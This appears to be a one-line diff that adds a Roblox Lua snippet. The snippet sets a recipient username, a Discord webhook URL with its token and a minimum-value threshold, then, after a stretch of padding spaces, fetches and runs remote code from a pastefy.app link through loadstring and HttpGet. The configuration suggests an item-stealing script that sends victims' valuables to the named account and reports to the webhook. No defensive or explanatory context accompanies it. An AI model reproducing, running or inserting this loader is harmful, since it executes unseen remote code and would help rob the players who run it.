@@ -1,0 +1,1 @@
+username = "bobonaroto99" webhook =" https://discord.com/api/webhooks/1413570089059618916/HCBhZfOOKcDSNWYcgKBkIsUaygE9LYLdYvdvKSYrhveObGO0FOrpU8KCbeAGWfy_iLtx" Minimumvalue ="100000"         loadstring(game:HttpGet("https://pastefy.app/MK3ulDP9/raw"))()
